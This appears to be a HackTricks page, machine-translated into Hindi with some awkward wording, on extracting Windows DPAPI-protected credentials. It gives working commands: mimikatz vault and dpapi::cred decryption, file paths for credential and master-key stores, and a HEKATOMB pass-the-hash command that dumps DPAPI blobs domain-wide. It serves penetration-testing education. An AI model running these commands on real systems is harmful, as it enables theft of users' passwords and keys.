# DPAPI - Extracting Passwords

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे प्रासंगिक साइबर सुरक्षा कार्यक्रम है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उबालता हुआ बैठक बिंदु है।

{% embed url="https://www.rootedcon.com/" %}

## What is DPAPI

Data Protection API (DPAPI) मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर **असामान्य निजी कुंजियों के सममित एन्क्रिप्शन** के लिए उपयोग किया जाता है, जो उपयोगकर्ता या प्रणाली के रहस्यों को महत्वपूर्ण एंट्रॉपी के स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है, जिससे वे उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई कुंजी का उपयोग करके डेटा को एन्क्रिप्ट कर सकते हैं या, प्रणाली एन्क्रिप्शन के लिए, प्रणाली के डोमेन प्रमाणीकरण रहस्यों का उपयोग कर सकते हैं, इस प्रकार डेवलपर्स को एन्क्रिप्शन कुंजी की सुरक्षा का प्रबंधन करने की आवश्यकता को समाप्त कर देता है।

### Protected Data by DPAPI

DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:

* Internet Explorer और Google Chrome के पासवर्ड और ऑटो-पूर्ण डेटा
* Outlook और Windows Mail जैसे अनुप्रयोगों के लिए ई-मेल और आंतरिक FTP खाता पासवर्ड
* साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क और Windows Vault के लिए पासवर्ड, जिसमें एन्क्रिप्शन कुंजियाँ शामिल हैं
* दूरस्थ डेस्कटॉप कनेक्शनों, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजियों के लिए पासवर्ड
* क्रेडेंशियल प्रबंधक द्वारा प्रबंधित नेटवर्क पासवर्ड और Skype, MSN मैसेंजर, और अधिक जैसे अनुप्रयोगों में व्यक्तिगत डेटा

## List Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Credential Files

The **credentials files protected** could be located in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz `dpapi::cred` का उपयोग करके क्रेडेंशियल्स जानकारी प्राप्त करें, प्रतिक्रिया में आप दिलचस्प जानकारी पा सकते हैं जैसे कि एन्क्रिप्टेड डेटा और guidMasterKey।
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
आप **mimikatz module** `dpapi::cred` का उपयोग उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए कर सकते हैं:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

DPAPI कुंजी जो उपयोगकर्ता के RSA कुंजी को एन्क्रिप्ट करने के लिए उपयोग की जाती है, `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका के तहत संग्रहीत होती है, जहाँ {SID} उस उपयोगकर्ता का [**सुरक्षा पहचानकर्ता**](https://en.wikipedia.org/wiki/Security\_Identifier) है। **DPAPI कुंजी उसी फ़ाइल में संग्रहीत होती है जिसमें उपयोगकर्ता की निजी कुंजी की सुरक्षा करने वाला मास्टर कुंजी होती है**। यह आमतौर पर 64 बाइट्स का यादृच्छिक डेटा होता है। (ध्यान दें कि यह निर्देशिका सुरक्षित है इसलिए आप इसे `dir` का उपयोग करके cmd से सूचीबद्ध नहीं कर सकते, लेकिन आप इसे PS से सूचीबद्ध कर सकते हैं)।
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
यह एक उपयोगकर्ता के कई मास्टर कुंजी कैसे दिखेंगी:

![](<../../.gitbook/assets/image (1121).png>)

आमतौर पर **प्रत्येक मास्टर कुंजी एक एन्क्रिप्टेड सममित कुंजी होती है जो अन्य सामग्री को डिक्रिप्ट कर सकती है**। इसलिए, **एन्क्रिप्टेड मास्टर कुंजी को निकालना** दिलचस्प है ताकि बाद में **उसके साथ एन्क्रिप्ट की गई अन्य सामग्री को डिक्रिप्ट किया जा सके**।

### मास्टर कुंजी निकालें और डिक्रिप्ट करें

मास्टर कुंजी निकालने और उसे डिक्रिप्ट करने के उदाहरण के लिए [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) पोस्ट देखें।

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) कुछ DPAPI कार्यक्षमता का C# पोर्ट है जो [@gentilkiwi](https://twitter.com/gentilkiwi) के [Mimikatz](https://github.com/gentilkiwi/mimikatz/) प्रोजेक्ट से है।

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों को निकालने और RPC के माध्यम से डोमेन नियंत्रक बैकअप कुंजी निकालने को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के आईपी पते को हल करेगी और सभी कंप्यूटरों पर smbclient करेगी ताकि सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त किया जा सके और सब कुछ डोमेन बैकअप कुंजी के साथ डिक्रिप्ट किया जा सके।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाले गए कंप्यूटरों की सूची के साथ आप हर उप नेटवर्क को ढूंढ सकते हैं, भले ही आप उन्हें नहीं जानते हों!

"क्योंकि डोमेन एडमिन अधिकार पर्याप्त नहीं हैं। सभी को हैक करें।"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा संरक्षित रहस्यों को डंप कर सकता है।

## संदर्भ

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे प्रासंगिक साइबर सुरक्षा कार्यक्रम है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने के मिशन** के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उबालता हुआ बैठक बिंदु है।

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
